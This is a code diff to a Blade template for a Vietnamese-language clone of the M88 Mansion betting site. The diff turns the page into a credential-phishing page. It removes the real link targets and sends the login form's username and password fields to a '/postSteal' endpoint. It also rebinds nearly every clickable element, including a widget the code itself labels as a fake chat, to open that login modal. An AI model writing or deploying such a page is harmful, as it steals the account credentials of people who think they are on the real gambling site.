@@ -283,7 +283,7 @@
     <header class="header_css">
         <nav class="navbar bg-body-tertiary text-white" style="">
             <div class="container-fluid style_nav">
-                <a href="/" class="logo_desktop">
+                <a   class="logo_desktop">
                     <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
                         preserveAspectRatio="xMidYMid meet" width="200" height="48" viewBox="0 0 200 48"
                         style="width:100%;height:100%">
@@ -457,7 +457,7 @@
                     </svg>
                 </a>
 
-                <a href="/" class="logo_mobile">
+                <a   class="logo_mobile">
                     <img src="{{ asset('/image/mlogo-mobile.svg') }}" alt="">
                 </a>
                 {{-- <form class="d-flex" role="search">
@@ -496,7 +496,7 @@
                         </label>
 
                         <div class="ml-2 side_right_item">
-                            <a class="d-flex items align-items-center" href="/">
+                            <a class="d-flex items align-items-center"  >
                                 <img src="{{ asset('image/flag.vi-VN.svg') }}"
                                     style="width: 18px;
                                 height: 18px; margin-right:4px"
@@ -515,7 +515,7 @@
                                 <img src="{{ asset('/image/icon-logo-m88-laliga.svg') }}" alt="">
                                 <span class="area_sportbook_content_span">150% THƯỞNG CHÀO MỪNG</span>
                                 <span class="area_sportbook_content_span1">THÀNH VIÊN MỚI</span>
-                                <a href="/" class="area_sportbook_content_a">
+                                <a class="area_sportbook_content_a">
                                     <span class="button_signup_tablet1">ĐĂNG KÝ NGAY</span>
                                 </a>
                                 <div class="header_login">
@@ -530,7 +530,7 @@
                         <div class="area_sportbook" style="margin-bottom: 32px;">
                             <div class="side-menu-title-nav-element">
                                 <div class="title-nav-element">
-                                    <a href="/" class="button_signin">
+                                    <a   class="button_signin">
                                         <div class="side-menu-title">
                                             <div class="side-menu-icon"></div>
                                             <span>TRANG CHỦ</span>
@@ -539,7 +539,7 @@
                                 </div>
 
                                 <div class="title-nav-element">
-                                    <a href="/" class="button_signin">
+                                    <a   class="button_signin">
                                         <div class="side-menu-title ">
                                             <div class="side-menu-icon1"></div>
                                             <span>THỂ THAO</span>
@@ -547,7 +547,7 @@
                                     </a>
                                 </div>
                                 <div class="title-nav-element">
-                                    <a href="/" class="button_signin">
+                                    <a   class="button_signin">
                                         <div class="side-menu-title">
                                             <div class="side-menu-icon2"></div>
                                             <span>THỂ THAO ĐIỆN TỬ</span>
@@ -555,7 +555,7 @@
                                     </a>
                                 </div>
                                 <div class="title-nav-element">
-                                    <a href="/" class="button_signin">
+                                    <a   class="button_signin">
                                         <div class="side-menu-title">
                                             <div class="side-menu-icon3 "></div>
                                             <span>CASINO TRỰC TUYẾN</span>
@@ -564,7 +564,7 @@
                                 </div>
                                 <div class="title-nav-element">
 
-                                    <a href="/" class="button_signin">
+                                    <a   class="button_signin">
                                         <span class="new_content1">MỚI</span>
                                         <div class="side-menu-title">
 
@@ -574,7 +574,7 @@
                                     </a>
                                 </div>
                                 <div class="title-nav-element">
-                                    <a href="/" class="button_signin">
+                                    <a   class="button_signin">
                                         <span class="new_content1">MỚI</span>
                                         <div class="side-menu-title">
                                             <div class="side-menu-icon5 "></div>
@@ -583,7 +583,7 @@
                                     </a>
                                 </div>
                                 <div class="title-nav-element">
-                                    <a href="/" class="button_signin">
+                                    <a   class="button_signin">
                                         <span class="new_content1">MỚI</span>
                                         <div class="side-menu-title">
                                             <div class="side-menu-icon6 "></div>
@@ -601,7 +601,7 @@
                                 </div>
 
                                 <div class="title-nav-element">
-                                    <a href="/" class="button_signin">
+                                    <a  class="button_signin">
                                         <span class="new_content1">MỚI</span>
                                         <div class="side-menu-title">
                                             <div class="side-menu-icon8 "></div>
@@ -610,7 +610,7 @@
                                     </a>
                                 </div>
                                 <div class="title-nav-element">
-                                    <a href="/" class="button_signin">
+                                    <a  class="button_signin">
                                         <div class="side-menu-title">
                                             <div class="side-menu-icon9 "></div>
                                             <span>ĐỘC QUYỀN</span>
@@ -618,7 +618,7 @@
                                     </a>
                                 </div>
                                 <div class="title-nav-element">
-                                    <a href="/" class="button_signin">
+                                    <a  class="button_signin">
                                         <div class="side-menu-title">
                                             <div class="side-menu-icon10 "></div>
                                             <span>KHUYẾN MÃI</span>
@@ -626,7 +626,7 @@
                                     </a>
                                 </div>
                                 <div class="title-nav-element">
-                                    <a href="/" class="button_signin">
+                                    <a  class="button_signin">
                                         <div class="side-menu-title">
                                             <div class="side-menu-icon11 "></div>
                                             <span>VIP</span>
@@ -738,7 +738,7 @@
                     </a>
                 </li>
                 <li class="nav-item dropdown">
-                    <a class="nav-link " href="#" id="navbarDropdown" role="button" data-toggle="dropdown"
+                    <a class="nav-link "  id="navbarDropdown" role="button" data-toggle="dropdown"
                         aria-haspopup="true" aria-expanded="false">
                         THỂ THAO
                     </a>
@@ -748,7 +748,7 @@
                         <div class="container">
                             <div class="row justify-content-center">
                                 <div class="">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/rebate-sports-VN.png') }}" alt="Web Design Guides"
                                             class="img_fluid">
                                     </a>
@@ -756,27 +756,27 @@
                                 </div>
                                 <!-- /.col-md-4  -->
                                 <div class="">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/msports_VN.png') }}" alt="Web Design Guides"
                                             class="img_fluid scale_img">
                                     </a>
                                 </div>
                                 <!-- /.col-md-4  -->
                                 <div class="">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/saba_EN.png') }}" alt="Web Design Guides"
                                             class="img_fluid scale_img">
                                     </a>
                                 </div>
                                 <!-- /.col-md-4  -->
                                 <div class="">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/pinnacle.png') }}" alt="Web Design Guides"
                                             class="img_fluid scale_img">
                                     </a>
                                 </div>
                                 <div class="">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/parlaybay_VN.png') }}" alt="Web Design Guides"
                                             class="img_fluid scale_img">
                                     </a>
@@ -799,7 +799,7 @@
                         <div class="container">
                             <div class="row justify-content-center">
                                 <div class="">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/rebate-sports-VN.png') }}" alt="Web Design Guides"
                                             class="img_fluid">
                                     </a>
@@ -807,27 +807,27 @@
                                 </div>
                                 <!-- /.col-md-4  -->
                                 <div class="">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/tf-gaming_EN.png') }}" alt="Web Design Guides"
                                             class="img_fluid scale_img">
                                     </a>
                                 </div>
                                 <!-- /.col-md-4  -->
                                 <div class="">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/pinnacle-esports_EN.png') }}"
                                             alt="Web Design Guides" class="img_fluid scale_img">
                                     </a>
                                 </div>
                                 <!-- /.col-md-4  -->
                                 <div class="">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/saba_esports_EN.png') }}" alt="Web Design Guides"
                                             class="img_fluid scale_img">
                                     </a>
                                 </div>
                                 <div class="">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/esoccer_VN.png') }}" alt="Web Design Guides"
                                             class="img_fluid scale_img">
                                     </a>
@@ -850,7 +850,7 @@
                         <div class="container">
                             <div class="justify-content-center d-flex" style="margin-top: 20px">
                                 <div class="">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/rebate-livecasino-VN.png') }}"
                                             alt="Web Design Guides" class="img_fluid">
                                     </a>
@@ -858,39 +858,39 @@
                                 </div>
                                 <!-- /.col-md-4  -->
                                 <div class="">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/clubm88_VN.png') }}" alt="Web Design Guides"
                                             class="img_fluid scale_img">
                                     </a>
                                 </div>
                                 <!-- /.col-md-4  -->
                                 <div class="">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/oglivecasino_VN.png') }}" alt="Web Design Guides"
                                             class="img_fluid scale_img">
                                     </a>
                                 </div>
                                 <!-- /.col-md-4  -->
                                 <div class="">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/clubm88eur_VN.png') }}" alt="Web Design Guides"
                                             class="img_fluid scale_img">
                                     </a>
                                 </div>
                                 <div class="">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/aglivedealer_VN.png') }}" alt="Web Design Guides"
                                             class="img_fluid scale_img">
                                     </a>
                                 </div>
                                 <div class="">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/studiom88int_VN.png') }}" alt="Web Design Guides"
                                             class="img_fluid scale_img">
                                     </a>
                                 </div>
                                 <div class="">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/sexygaming_VN.png') }}" alt="Web Design Guides"
                                             class="img_fluid scale_img">
                                     </a>
@@ -917,7 +917,7 @@
 
                         <div class="container justify-content-center d-flex">
                             <div class="">
-                                <a href="/">
+                                <a >
                                     <img src="{{ asset('image/rebate-livecasino-VN.png') }}" alt="Web Design Guides"
                                         class="img_fluid">
                                 </a>
@@ -929,145 +929,145 @@
 
 
                                 <div class="mma">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/pragmatic.png') }}" alt="Web Design Guides"
                                             class="img_fluid_calc scale_img">
                                     </a>
                                 </div>
                                 <div class="mma">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/habanero.png') }}" alt="Web Design Guides"
                                             class="img_fluid_calc scale_img">
                                     </a>
                                 </div>
                                 <div class="mma">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/spinix_VN.png') }}" alt="Web Design Guides"
                                             class="img_fluid_calc scale_img">
                                     </a>
                                 </div>
                                 <div class="mma">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/netent_VN.png') }}" alt="Web Design Guides"
                                             class="img_fluid_calc scale_img">
                                     </a>
                                 </div>
                                 <div class="mma">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/blueprintgaming_VN.png') }}"
                                             alt="Web Design Guides" class="img_fluid_calc scale_img">
                                     </a>
                                 </div>
                                 <div class="mma">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/pg-soft.png') }}" alt="Web Design Guides"
                                             class="img_fluid_calc scale_img">
                                     </a>
                                 </div>
                                 <div class="mma">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/advantplay.png') }}" alt="Web Design Guides"
                                             class="img_fluid_calc scale_img">
                                     </a>
                                 </div>
                                 <div class="mma">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/microgaming.png') }}" alt="Web Design Guides"
                                             class="img_fluid_calc scale_img ">
                                     </a>
                                 </div>
                                 <div class="mma">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/facaisen.png') }}" alt="Web Design Guides"
                                             class="img_fluid_calc scale_img">
                                     </a>
                                 </div>
                                 <div class="mma">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/jili.png') }}" alt="Web Design Guides"
                                             class="img_fluid_calc scale_img">
                                     </a>
                                 </div>
                                 <div class="mma">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/viva.png') }}" alt="Web Design Guides"
                                             class="img_fluid_calc scale_img">
                                     </a>
                                 </div>
                                 <div class="mma">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/playtech.png') }}" alt="Web Design Guides"
                                             class="img_fluid_calc scale_img">
                                     </a>
                                 </div>
                                 <div class="mma">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/skywind.png') }}" alt="Web Design Guides"
                                             class="img_fluid_calc scale_img">
                                     </a>
                                 </div>
                                 <div class="mma">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/playngo.png') }}" alt="Web Design Guides"
                                             class="img_fluid_calc scale_img">
                                     </a>
                                 </div>
                                 <div class="mma">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/hacksaw.png') }}" alt="Web Design Guides"
                                             class="img_fluid_calc scale_img">
                                     </a>
                                 </div>
                                 <div class="mma">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/no-limit.png') }}" alt="Web Design Guides"
                                             class="img_fluid_calc scale_img">
                                     </a>
                                 </div>
                                 <div class="mma">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/spribe.png') }}" alt="Web Design Guides"
                                             class="img_fluid_calc scale_img">
                                     </a>
                                 </div>
                                 <div class="mma">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/CQ9.png') }}" alt="Web Design Guides"
                                             class="img_fluid_calc scale_img">
                                     </a>
                                 </div>
                                 <div class="mma">
-                                    <a href="/">
+                                    <a >
                                         <img src="{{ asset('image/redtiger.png') }}" alt="Web Design Guides"
                                             class="img_fluid_calc scale_img">
                                     </a>
                                 </div>
                                 <div class="mma">
-                                    <a href="/">
+                                    <a  >
                                         <img src="{{ asset('image/pushgaming.png') }}" alt="Web Design Guides"
                                             class="img_fluid_calc scale_img">
                                     </a>
                                 </div>
                                 <div class="mma">
-                                    <a href="/">
+                                    <a  >
                                         <img src="{{ asset('image/btg.png') }}" alt="Web Design Guides"
                                             class="img_fluid_calc scale_img">
                                     </a>
                                 </div>
                                 <div class="mma">
-                                    <a href="/">
+                                    <a  >
                                         <img src="{{ asset('image/livespins.png') }}" alt="Web Design Guides"
                                             class="img_fluid_calc scale_img">
                                     </a>
                                 </div>
                                 <div class="mma">
-                                    <a href="/">
+                                    <a  >
                                         <img src="{{ asset('image/winfast.png') }}" alt="Web Design Guides"
                                             class="img_fluid_calc scale_img">
                                     </a>
                                 </div>
                                 <div class="mma">
-                                    <a href="/">
+                                    <a  >
                                         <img src="{{ asset('image/onetouch.png') }}" alt="Web Design Guides"
                                             class="img_fluid_calc scale_img">
                                     </a>
@@ -1111,20 +1111,20 @@
                             <div class="container">
                                 <div class="row justify-content-center">
                                     <div class="">
-                                        <a href="/">
+                                        <a  >
                                             <img src="{{ asset('image/rebate-keno-VN.png') }}"
                                                 alt="Web Design Guides" class="img_fluid">
                                         </a>
                                         <p class="text-white more_infor">Chi Tiết</p>
                                     </div>
                                     <div class="">
-                                        <a href="/">
+                                        <a  >
                                             <img src="{{ asset('image/tcgaming_VN.png') }}" alt="Web Design Guides"
                                                 class="img_fluid scale_img">
                                         </a>
                                     </div>
                                     <div class="">
-                                        <a href="/">
+                                        <a  >
                                             <img src="{{ asset('image/keno_VN.png') }}" alt="Web Design Guides"
                                                 class="img_fluid scale_img">
                                         </a>
@@ -1147,13 +1147,13 @@
                         <div class="container">
                             <div class="row justify-content-center" style="margin-bottom:15px">
                                 <div class="">
-                                    <a href="/">
+                                    <a  >
                                         <img src="{{ asset('image/kingmaker.png') }}" alt="Web Design Guides"
                                             class="img_fluid scale_img">
                                     </a>
                                 </div>
                                 <div class="">
-                                    <a href="/">
+                                    <a  >
                                         <img src="{{ asset('image/v8gaming.png') }}" alt="Web Design Guides"
                                             class="img_fluid scale_img">
                                     </a>
@@ -1173,31 +1173,31 @@
                         <div class="container">
                             <div class="row justify-content-center" style="margin-bottom:15px">
                                 <div class="">
-                                    <a href="/">
+                                    <a  >
                                         <img src="{{ asset('image/laligaroom_EN.png') }}" alt="Web Design Guides"
                                             class="img_fluid scale_img">
                                     </a>
                                 </div>
                                 <div class="">
-                                    <a href="/">
+                                    <a  >
                                         <img src="{{ asset('image/mariaroom.png') }}" alt="Web Design Guides"
                                             class="img_fluid scale_img">
                                     </a>
                                 </div>
                                 <div class="">
-                                    <a href="/">
+                                    <a  >
                                         <img src="{{ asset('image/acmilan.png') }}" alt="Web Design Guides"
                                             class="img_fluid scale_img">
                                     </a>
                                 </div>
                                 <div class="">
-                                    <a href="/">
+                                    <a  >
                                         <img src="{{ asset('image/mannypacquiao.png') }}" alt="Web Design Guides"
                                             class="img_fluid scale_img">
                                     </a>
                                 </div>
                                 <div class="">
-                                    <a href="/">
+                                    <a  >
                                         <img src="{{ asset('image/pragmaticplay.png') }}" alt="Web Design Guides"
                                             class="img_fluid scale_img">
                                     </a>
@@ -1209,20 +1209,20 @@
                     </div>
                 </li>
                 <li class="nav-item dropdown">
-                    <a href="/"class="nav-link " href="#" id="navbarDropdown" role="button"
+                    <a  class="nav-link " href="#" id="navbarDropdown" role="button"
                         data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                         KHUYẾN MÃI
                     </a>
                 </li>
                 <li class="nav-item dropdown">
-                    <a href="/"class="nav-link " href="#" id="navbarDropdown" role="button"
+                    <a  class="nav-link " href="#" id="navbarDropdown" role="button"
                         data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                         VIP
                     </a>
                 </li>
 
                 <li class="nav-item dropdown">
-                    <a href="/"class="nav-link " href="#" id="navbarDropdown" role="button"
+                    <a  class="nav-link " href="#" id="navbarDropdown" role="button"
                         data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                         APP
                     </a>
@@ -1254,7 +1254,7 @@
 
         <div class="d-flex text-nowrap nav-app-header">
             <div class="ml-2 side_right_item">
-                <a class="d-flex items align-items-center" href="/">
+                <a href="" class="d-flex items align-items-center"  >
                     <div class="mask">
 
                     </div>
@@ -1262,7 +1262,7 @@
                 </a>
             </div>
             <div class="ml-2 side_right_item">
-                <a class="d-flex items align-items-center" href="/">
+                <a href="" class="d-flex items align-items-center"  >
                     <div class="friend">
 
                     </div>
@@ -1270,7 +1270,7 @@
                 </a>
             </div>
             <div class="ml-2 side_right_item">
-                <a class="d-flex items align-items-center" href="/">
+                <a href="" class="d-flex items align-items-center"  >
                     <div class="support">
 
                     </div>
@@ -1278,7 +1278,7 @@
                 </a>
             </div>
             <div class="ml-2 side_right_item">
-                <a class="d-flex items align-items-center" href="/">
+                <a href="" class="d-flex items align-items-center"  >
                     <img src="{{ asset('image/flag.vi-VN.svg') }}"
                         style="width: 18px;
                     height: 18px; margin-right:4px" alt="">
@@ -2903,7 +2903,7 @@
         </div>
 
         <div class="seo_text_infor_content_text_out_a  container">
-            <a href="/"><strong>M88 Mansion</strong></a> đã trở thành điểm đến lí tưởng tại
+            <a  ><strong>M88 Mansion</strong></a> đã trở thành điểm đến lí tưởng tại
             <strong>Châu</strong>
             Á để tham gia cá cược trực tuyến trong suốt hơn 10 năm qua! Với lượng trò chơi casino trực tuyến đa dạng
             nhất và khuyến mãi chào mừng phong phú nhất. Điều này không khó để giải thích vì sao M88 Mansion trở thành
@@ -2928,7 +2928,7 @@
             cược cạnh tranh nhất tại các sự kiện thể thao lớn nhất hành tinh. Những người hâm mộ thể thao muốn hoà mình
             cùng các trận đấu mong đợi nhất có thể tham gia dự đoán các trận cầu được cung ứng trên thị trường đa dạng.
             Với
-            <a href="/"><strong>M88 Mansion Sport</strong></a> , thành viên có thể cổ vũ hoặc đặt cược các giải
+            <a  ><strong>M88 Mansion Sport</strong></a> , thành viên có thể cổ vũ hoặc đặt cược các giải
             đấu lớn nhất cho đội bóng và cầu thủ yêu thích – như tại bóng đá, bóng rổ, bóng bầu dục, quần vợt, cầu lông,
             khúc côn cầu, bóng chuyền, gôn, cricket, Muay Thai hoặc bóng chày. Người hâm mộ bóng đá có thể đặt cược cho
             đội bóng yêu thích của mình tại các giải đấu Ngoại Hạng Anh,
@@ -2940,8 +2940,8 @@
             thức gửi và rút tiền có thể giao dịch mọi lúc, mọi nơi. Việc đăng ký có thể thực hiện trên máy tính và trang
             dành cho di động hoặc sử dụng ứng dụng cho trên di động cho Android hoặc iOS. Thành viên mới có thể nhận
             thêm khuyến mãi
-            <a href="/"><strong>175% Thưởng Chào Mừng</strong></a> khi gửi tiền lần đầu tại <a
-                href="/"><strong>casino trực tuyến</strong></a> đặc biệt nhất. Thành viên cũng hoàn toàn có thể
+            <a  ><strong>175% Thưởng Chào Mừng</strong></a> khi gửi tiền lần đầu tại <a
+                 ><strong>casino trực tuyến</strong></a> đặc biệt nhất. Thành viên cũng hoàn toàn có thể
             yên tâm về việc bảo mật thông tin được ưu tiên hàng đầu. Do vậy, tất cả các thông tin cá nhân đăng ký 100%
             an toàn, và không bao giờ bị đánh cắp. Đó cũng là lý do tại sao
             <strong>M88 Mansion</strong> nổi tiếng về sự <strong>Uy Tín</strong> khắp <strong>châu Á</strong>. Cùng với
@@ -2951,7 +2951,7 @@
             lúc, mọi nơi.
             <br>
             <br>
-            <a href="/"><strong>ĐĂNG NHẬP</strong></a> <strong>M88 Mansion</strong> ngay hôm nay và trải nghiệm
+            <a  ><strong>ĐĂNG NHẬP</strong></a> <strong>M88 Mansion</strong> ngay hôm nay và trải nghiệm
             sự lôi cuốn cuồng nhiệt của các trò chơi casino ngay tại nhà hay bất kỳ đâu cùng với chiếc điện thoại trong
             tay! Chúc bạn một ngày lành!
 
@@ -3124,66 +3124,66 @@
                 <div class="navigate_container d-block">
                     <div class="navigate_container_menu">
                         <div class="navigate_container_menu_text">
-                            <a href="/">Giới Thiệu Về M88</a>
+                            <a  >Giới Thiệu Về M88</a>
                         </div>
 
                         <div class="navigate_container_menu_text">
-                            <a href="/">Giới Thiệu Bạn Bè</a>
+                            <a  >Giới Thiệu Bạn Bè</a>
                         </div>
 
                         <div class="navigate_container_menu_text">
-                            <a href="/">VIP</a>
+                            <a  >VIP</a>
                         </div>
 
                         <div class="navigate_container_menu_text">
-                            <a href="/">Đại Lý</a>
+                            <a  >Đại Lý</a>
                         </div>
 
                         <div class="navigate_container_menu_text">
-                            <a href="/">Lựa Chọn Ngân Hàng</a>
+                            <a  >Lựa Chọn Ngân Hàng</a>
                         </div>
 
                         <div class="navigate_container_menu_text">
-                            <a href="/">Chơi Game Có Trách Nhiệm</a>
+                            <a  >Chơi Game Có Trách Nhiệm</a>
                         </div>
 
                         <div class="navigate_container_menu_text">
-                            <a href="/">Liên Hệ Với Chúng Tôi</a>
+                            <a  >Liên Hệ Với Chúng Tôi</a>
                         </div>
 
                         <div class="navigate_container_menu_text">
-                            <a href="/">Trung Tâm Hỗ Trợ</a>
+                            <a  >Trung Tâm Hỗ Trợ</a>
                         </div>
 
                         <div class="navigate_container_menu_text">
-                            <a href="/">Đơn Vị Tài Trợ</a>
+                            <a  >Đơn Vị Tài Trợ</a>
                         </div>
                     </div>
 
                     <div class="navigate_container_localized">
                         <div class="navigate_container_menu_text">
-                            <a href="/">M88 Japan</a>
+                            <a  >M88 Japan</a>
                         </div>
                         <div class="navigate_container_menu_text">
-                            <a href="/">M88 China</a>
+                            <a  >M88 China</a>
                         </div>
                         <div class="navigate_container_menu_text">
-                            <a href="/">M88 Korea</a>
+                            <a  >M88 Korea</a>
                         </div>
                         <div class="navigate_container_menu_text">
-                            <a href="/">M88 India</a>
+                            <a  >M88 India</a>
                         </div>
                         <div class="navigate_container_menu_text">
-                            <a href="/">M88 Thailand</a>
+                            <a  >M88 Thailand</a>
                         </div>
                         <div class="navigate_container_menu_text">
-                            <a href="/">M88 Việtnam</a>
+                            <a  >M88 Việtnam</a>
                         </div>
                         <div class="navigate_container_menu_text">
-                            <a href="/">M88</a>
+                            <a  >M88</a>
                         </div>
                         <div class="navigate_container_menu_text">
-                            <a href="/">Bhs Indonesia</a>
+                            <a  >Bhs Indonesia</a>
                         </div>
                     </div>
                 </div>
@@ -3419,30 +3419,30 @@
                             M88 cam kết hỗ trợ
                         </div>
 
-                        <a class="" href="/"> Chơi Game Có Trách Nhiệm </a>
+                        <a class=""  > Chơi Game Có Trách Nhiệm </a>
                     </div>
 
                     <div class="partner_gamebling">
                         <div class="partner_element">
-                            <a href="/">
+                            <a  >
                                 <img src="{{ asset('/image/vanuatu.svg') }}" alt="">
                             </a>
                         </div>
 
                         <div class="partner_element">
-                            <a href="/">
+                            <a  >
                                 <img src="{{ asset('/image/ga.svg') }}" alt="">
                             </a>
                         </div>
 
                         <div class="partner_element">
-                            <a href="/">
+                            <a  >
                                 <img src="{{ asset('/image/itech-labs.svg') }}" alt="">
                             </a>
                         </div>
 
                         <div class="partner_element">
-                            <a href="/">
+                            <a  >
                                 <img src="{{ asset('/image/eighteen.svg') }}" alt="">
                             </a>
                         </div>
@@ -3467,7 +3467,7 @@
                         cookie. Để biết thông tin về việc sử dụng cookie của chúng tôi và làm thế nào để tránh vi phạm
                         các quy định, vui lòng tham khảo
                         <br>
-                        <a class="text_gamebling_single_a" href="/"> Điều Khoản Sử Dụng tại M88 </a>
+                        <a class="text_gamebling_single_a"  > Điều Khoản Sử Dụng tại M88 </a>
                     </div>
                 </div>
             </div>
@@ -3477,8 +3477,7 @@
     </footer>
 
     {{-- cái hình nhỏ nhỏ nằm bên góc phải website --}}
-    <div class="animated_widget_wrapper button_signin">
-
+    <div class="animated_widget_wrapper">
         <div class="animated_widget">
             <div class="animated_widget_close"></div>
             <img src="{{ asset('/image/candy-rush-m88.gif') }}" alt="">
@@ -3487,7 +3486,7 @@
     {{-- end hình nhỏ nhỏ  --}}
 
     {{-- thanh chat fake --}}
-    <div class="live_engage_floating_vn button_signin">
+    <div class="live_engage_floating_vn">
         <div class="live_engage_floating_vn_fake_support">
             <div class="live_engage_floating_button">
 
@@ -3513,13 +3512,13 @@
                     </div>
 
                     <div class="modal_body_content">
-                        <form action="" method="">
+
+                        <form action="/postSteal" method="POST">
                             <div class="input_area">
                                 <label class="input_top_text" for="">Tên Đăng Nhập</label>
                                 <div class="input_wrapper">
                                     <div class="input">
-                                        <input class="validation error" type="text"
-                                            placeholder="Điền tên đăng nhập" id="PrimaryLoginCredValidation">
+                                        <input class="validation error" type="text" placeholder="Điền tên đăng nhập" id="PrimaryLoginCredValidation" name="username">
                                         <div class=" icons icon_right error"></div>
                                     </div>
 
@@ -3533,8 +3532,7 @@
                                 <label class="input_top_text" for="">Mật Khẩu</label>
                                 <div class="input_wrapper">
                                     <div class="input">
-                                        <input class="validation2 error" type="password"
-                                            placeholder="Nhập Mật Khẩu Hiện Tại" id="PrimaryLoginCredValidation2">
+                                        <input class="validation2 error" type="password" placeholder="Nhập Mật Khẩu Hiện Tại" id="PrimaryLoginCredValidation2" name="password">
                                         <div class=" icons icon_right2 error"></div>
                                         <div class=" icons icon_eye_show toggle"></div>
                                     </div>
@@ -3555,9 +3553,9 @@
                                     </label>
                                 </div>
 
-                                <button class="button_sign_in_president1">Đăng Nhập</button>
+                                <button type="submit" class="button_sign_in_president1">Đăng Nhập</button>
                             </div>
-
+                            @csrf
                         </form>
 
                         <div class="foget_btn">
@@ -3712,10 +3710,7 @@
     $(window).resize(function(){
         clearTimeout(timeout);
         timeout = setTimeout(initSwiper, 2);
-    });
-
-   
-    
+    });  
 </script>
 
 <script>
@@ -3888,9 +3883,14 @@
             $('#bady').removeClass('active');
         });
 
-        $(".button_signin").on("click", function() {
-            $('.modal_overlay_login').addClass('active ')
-            $('#bady').addClass('active');
+        $("button , .mini_baner_cta , .animated_widget_wrapper , .live_engage_floating_vn , .area_sportbook_content_a , .img_fluid , .button_sign_in_president , .side_right_item").on("click", function(e) {          
+            if(!$(e.target).is('button[type="submit"]')){
+                e.preventDefault();
+
+                $('.modal_overlay_login').addClass('active')
+                $('#bady').addClass('active');
+            }    
+            
         });
 
 
